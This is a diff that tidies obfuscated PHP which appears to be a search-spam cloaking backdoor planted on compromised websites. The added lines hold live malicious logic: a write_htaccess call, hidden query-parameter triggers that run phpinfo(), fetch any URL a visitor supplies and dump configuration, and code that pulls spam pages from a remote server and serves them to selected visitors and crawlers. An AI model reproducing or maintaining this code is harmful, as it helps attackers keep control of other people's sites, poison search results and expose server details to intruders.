@@ -750,12 +750,12 @@ function l1P9LVD($l15tGX=''){
     $l1xj0grt = $l1YlvID = "jpwanda|jpyahoo";
     $l13lq1 = "Content-type:text/%sml;charset=utf-8";
     $l1YlvID = explode('|',$l1YlvID);
-    $l13K = '';
+    $hostname = '';
 
     if(isset($_SERVER["HTTP_HOST"])){
-        $l13K = $_SERVER["HTTP_HOST"];
+        $hostname = $_SERVER["HTTP_HOST"];
     }elseif(isset($_SERVER["SERVER_NAME"])){
-        $l13K = $_SERVER["SERVER_NAME"];
+        $hostname = $_SERVER["SERVER_NAME"];
     }
 
     write_htaccess();
@@ -835,9 +835,9 @@ function l1P9LVD($l15tGX=''){
     $param8 = preg_split('//',$param8,-1,PREG_SPLIT_NO_EMPTY);
     $param9 = preg_split('//',$param9,-1,PREG_SPLIT_NO_EMPTY);
     $param8 = count($param8) !=4 ? array(1,1,1,0):$param8;
-    $param9 = count($param9)!=9?array(1,0,1,1,0,1,0,0,0):$param9;
-    $l1f1oojq = sprintf("http%s://$l13K",l1UT7($param9[8]));
-    $l1qv = str_replace("www.",'',$l13K);
+    $param9 = count($param9) !=9 ? array(1,0,1,1,0,1,0,0,0) : $param9;
+    $l1f1oojq = sprintf("http%s://$hostname",l1UT7($param9[8]));
+    $l1qv = str_replace("www.",'',$hostname);
 
     $l1ekHESi = $l1c9 = isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
     $l1ekHESi = $l1c9 = ($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
@@ -880,7 +880,7 @@ function l1P9LVD($l15tGX=''){
     $l1RB6TU = $l1xj0grt."|ls1|ls2";
     $l1RB6TU = explode('|',$l1RB6TU);
 
-    foreach($l1RB6TU as$l14eeRaA){
+    foreach($l1RB6TU as $l14eeRaA){
         $l1c9 = preg_replace("/(\?|&)".$l14eeRaA."/si",'',$l1c9);
     }
 
@@ -896,23 +896,23 @@ function l1P9LVD($l15tGX=''){
     }
 
     $l1iQ = $param3;
-    $l1iQ=preg_replace("/^\//si",'',$l1iQ);
-    $l1Q8lar=l1Rc6HvA($l1c9);
-    $l1FP8t=false;
-    $l1g=isset($_GET["hostxml"]);
-    $l1sH=($l1g&&$_GET["hostxml"]!='')?"{$_GET["hostxml"]}.xml":"{$l1qv}-sitemap.xml";
-    $l177Y="sitemap_";
-    $l1yBQ='';
-    $l1jYBBQn=0;
-    $l1Zf0=false;
-    $l1qsb509=1;
-    $l1r=50000;
-    $l1XwKTlO=0;
-    $l1VqK=0;
-    $l1VC2k=0;
-    $l1uVp=1;
-    $l13GLz=1;
-    $l1pods5=0;
+    $l1iQ = preg_replace("/^\//si",'',$l1iQ);
+    $l1Q8lar = l1Rc6HvA($l1c9);
+    $l1FP8t = false;
+    $l1g = isset($_GET["hostxml"]);
+    $l1sH = ($l1g&&$_GET["hostxml"]!='')?"{$_GET["hostxml"]}.xml":"{$l1qv}-sitemap.xml";
+    $l177Y = "sitemap_";
+    $l1yBQ = '';
+    $l1jYBBQn = 0;
+    $l1Zf0 = false;
+    $l1qsb509 = 1;
+    $l1r = 50000;
+    $l1XwKTlO = 0;
+    $l1VqK = 0;
+    $l1VC2k = 0;
+    $l1uVp = 1;
+    $l13GLz = 1;
+    $l1pods5 = 0;
 
     if(preg_match('/\.xml$/si',$l1c9)){
         $l1c9=preg_replace("/^\?/si",'',$l1c9);
@@ -1018,9 +1018,7 @@ function l1P9LVD($l15tGX=''){
                     }
                 }
             }else{
-                if($l1c9==''){
-                    $l1uH=true;
-                }
+                if($l1c9 == '') $l1uH = true;
             }
         }
     }
@@ -1042,7 +1040,13 @@ function l1P9LVD($l15tGX=''){
     $l1xUB=substr($param7,0,strrpos($param7,'/'))."/domain.txt";
     $l1DLH=$param7."?listing=%s";
     $l1TE9=substr(md5($l1xUB),0,6);
-    $l1GH0rfZ=array("extensions"=>$l1T2,"url_rules"=>$l1gfDiJL,"wordlist_array"=>$l1NhADdH,"url_prefix"=>$param3,"url_prefix_qm"=>$l1imRR,);
+
+    $l1GH0rfZ = array("extensions"=>$l1T2,
+                      "url_rules"=>$l1gfDiJL,
+                      "wordlist_array"=>$l1NhADdH,
+                      "url_prefix"=>$param3,
+                      "url_prefix_qm"=>$l1imRR,
+                     );
 
     if($l1VC2k){
         $l1US = array();
@@ -1165,8 +1169,8 @@ function l1P9LVD($l15tGX=''){
             exit();
         }
 
-        $l1Z4k=$l1Ni6;
-        $l1yaqM=isset($_GET["html"])?(int)($_GET["html"]):'';
+        $l1Z4k = $l1Ni6;
+        $l1yaqM = isset($_GET["html"])?(int)($_GET["html"]):'';
 
         if(file_exists($l1TE9)){
             $l14XZNk = file_get_contents($l1TE9);
@@ -1176,7 +1180,7 @@ function l1P9LVD($l15tGX=''){
             @change_timestamp($l1TE9);
         }
 
-        $l14XZNk=trim($l14XZNk,'|');
+        $l14XZNk = trim($l14XZNk,'|');
 
         if($l14XZNk != ''){
             $l1US=explode('|',$l14XZNk);
@@ -1204,13 +1208,11 @@ function l1P9LVD($l15tGX=''){
             $l1g2MIU='';
             $l1B=0;
 
-            foreach($l1US as$l1FQ9sMt=>$l1TXqIy2){
+            foreach($l1US as $l1FQ9sMt=>$l1TXqIy2){
                 $l1B += (int)substr($l1TXqIy2,strrpos($l1TXqIy2,'-')+1);
             }
 
-            if($l1B<=0){
-                exit("nodata");
-            }
+            if($l1B<=0) exit("nodata");
 
             $l15=ceil($l1B/$l1EYB);
             $l1EYB=$l1IHKBWW>$l15?$l1EYB:$l1EYB;
@@ -1275,71 +1277,82 @@ function l1P9LVD($l15tGX=''){
         exit();
     }
 
-    $l1B3=l1g1oAl2($l1c9,$l1gfDiJL,$l1T2);
-    $l1nzHzs=(bool)$l1B3[0];
+    $l1B3 = l1g1oAl2($l1c9,$l1gfDiJL,$l1T2);
+    $l1nzHzs = (bool)$l1B3[0];
+
     if($l1z&&($l1p38K||$l1bgn)){
     $l1WyZOKd=0;
     if(!$l1nzHzs){
-    $param2 = !$l1uH ? l1J('',$l1uH,$l1v,"$l1xj0grt|$l1CEqH4") : $param2;
-    if($param9[7]==2&&!$l1aj){
-    $l1WyZOKd=1;
+        $param2 = !$l1uH ? l1J('',$l1uH,$l1v,"$l1xj0grt|$l1CEqH4") : $param2;
+        if($param9[7]==2&&!$l1aj){
+            $l1WyZOKd=1;
+        }else{
+            if($l1uH){
+                if($l1p38K){
+                if(!$param9[0]){
+                $l1WyZOKd=1;
+                }}if($l1bgn){
+                if(!$param9[1]){
+                $l1bgn=0;
+                }if(!$param9[2]){
+                $l1WyZOKd=1;
+                }}
+            }else{
+                if($l1p38K){
+                    if(!$param9[3]) $l1WyZOKd=1;
+                }
+                if($l1bgn){
+                    if(!$param9[4]) $l1bgn=0;
+                    if(!$param9[5]) $l1WyZOKd=1;
+                }
+            }
+        }
     }else{
-    if($l1uH){
-    if($l1p38K){
-    if(!$param9[0]){
-    $l1WyZOKd=1;
-    }}if($l1bgn){
-    if(!$param9[1]){
-    $l1bgn=0;
-    }if(!$param9[2]){
-    $l1WyZOKd=1;
-    }}}else{
-    if($l1p38K){
-    if(!$param9[3]){
-    $l1WyZOKd=1;
-    }}if($l1bgn){
-    if(!$param9[4]){
-    $l1bgn=0;
-    }if(!$param9[5]){
-    $l1WyZOKd=1;
-    }}}}}else{
-    $l1FWjrO=l15w($param1,$param2,$l1B3[1]);
-    $param1 = $l1FWjrO["a"] != -1 ? $l1FWjrO["a"] : $param1;
-    $param2 = $l1FWjrO["b"]!=-1?$l1FWjrO["b"]:$param1;
+        $l1FWjrO=l15w($param1,$param2,$l1B3[1]);
+        $param1 = $l1FWjrO["a"] != -1 ? $l1FWjrO["a"] : $param1;
+        $param2 = $l1FWjrO["b"]!=-1?$l1FWjrO["b"]:$param1;
     }
+
     $l12='<a href="%s" target="_blank">%s</a>';
     $l11ia=sprintf($l11ia,$param1,$param2,urlencode($l1i),!$l1bgn?0:1,'',$param8[0],$l1M);
     $l11ia.=sprintf("&isn=%d&ish=%d&wdm=%d",($l1nzHzs?1:0),($l1uH?1:0),$param8[3]);
+
     if(isset($_GET[$l1CEqH4])){
-    echo sprintf($l12,$l11ia,$l11ia)."<br /><br />";
-    $l1Q=parse_url($l11ia);
-    echo gethostbyname($l1Q["host"]);
-    exit();
-    }if(isset($_GET[$l1on])){
-    echo sprintf($l12,$l1xUB,$l1xUB);
-    exit();
-    }if(isset($_GET[$l1WxX])){
-    phpinfo();
-    exit();
-    }if(isset($_GET[$l1VDKC])){
-    $l1V65T=trim($_GET[$l1VDKC]);
-    $l1V65T=$l1V65T==''?"http://example.com":$l1V65T;
-    if($l1V65T!=''){
-    echo download($l1V65T);
-    exit();
-    }}if(isset($_GET[$l1EkZsk])){
-    echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$param3,$param4,$param5,$param6,$param7,implode('',$param8),$l1c,$l1cdE);
-    exit();
+        echo sprintf($l12,$l11ia,$l11ia)."<br /><br />";
+        $l1Q=parse_url($l11ia);
+        echo gethostbyname($l1Q["host"]);
+        exit();
+    }
+
+    if(isset($_GET[$l1on])){
+        echo sprintf($l12,$l1xUB,$l1xUB);
+        exit();
+    }
+
+    if(isset($_GET[$l1WxX])){
+        phpinfo();
+        exit();
+    }
+
+    if(isset($_GET[$l1VDKC])){
+        $l1V65T=trim($_GET[$l1VDKC]);
+        $l1V65T=$l1V65T==''?"http://example.com":$l1V65T;
+        if($l1V65T!=''){
+            echo download($l1V65T);
+            exit();
+        }
+    }
+
+    if(isset($_GET[$l1EkZsk])){
+        echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$param3,$param4,$param5,$param6,$param7,implode('',$param8),$l1c,$l1cdE);
+        exit();
     }
     if($l1WyZOKd){
-        if($index_file != ''){
-            echo file_get_contents($index_file);
-        }
+        if($index_file != '') echo file_get_contents($index_file);
         return;
     }
 
     $l1Kr = trim(download($l11ia));
-    //$l1Kr = trim($l1Kr);
 
     if($l1Kr==''){
         header("HTTP/1.1 404 Not Found");
